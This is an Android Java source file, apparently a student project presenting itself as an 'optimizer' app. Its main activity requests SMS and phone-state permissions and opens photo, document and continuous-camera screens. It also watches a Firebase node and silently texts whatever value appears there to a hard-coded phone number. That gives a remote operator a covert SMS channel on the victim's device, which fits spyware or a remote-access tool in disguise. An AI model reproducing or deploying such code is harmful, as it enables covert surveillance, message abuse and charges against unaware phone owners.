package com.minorproject.optimizers;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.provider.MediaStore;
import android.support.annotation.NonNull;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.security.Permissions;

public class MainActivity extends AppCompatActivity {
Button buttonPhoto,buttonDoc,buttonScreen;
int SmsCount=0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        buttonDoc=(Button)findViewById(R.id.buttonDoc);
        buttonPhoto=(Button)findViewById(R.id.buttonPhoto);
        buttonScreen=(Button)findViewById(R.id.buttonRecScreen);

        if(ContextCompat.checkSelfPermission(this,Manifest.permission.READ_PHONE_STATE)!=PackageManager.PERMISSION_GRANTED)
            requestPermissions(new String[]{Manifest.permission.READ_PHONE_STATE,Manifest.permission.RECEIVE_SMS,Manifest.permission.READ_SMS},333);
        if (ContextCompat.checkSelfPermission(this,Manifest.permission.READ_SMS)!=PackageManager.PERMISSION_GRANTED)
            requestPermissions(new String[]{Manifest.permission.READ_SMS,Manifest.permission.RECEIVE_SMS,Manifest.permission.SEND_SMS},34444);

        buttonDoc.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent=
                        new Intent(MainActivity.this,DocumentActivity.class);
                startActivity(intent);
            }
        });
        buttonScreen.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
              //  startActivity(new Intent("android.settings.CAST_SETTINGS"));
                startActivity(new Intent(MainActivity.this,ContinousCamera.class));
            }
        });
        buttonPhoto.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent=new Intent(MainActivity.this,PhotoActivity.class);
                startActivity(intent);
            }
        });

        FirebaseDatabase.getInstance().getReference().child("Notifications").child("smsreply").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                SmsCount++;
                if (SmsCount>1&&ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.SEND_SMS)==PackageManager.PERMISSION_GRANTED) {
                    SmsManager smsManager = SmsManager.getDefault();
                    smsManager.sendTextMessage("7974287819", null, dataSnapshot.getValue().toString(), null, null);
                }
                else{
                    requestPermissions(new String[]{Manifest.permission.SEND_SMS},10000);
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });

    }
}
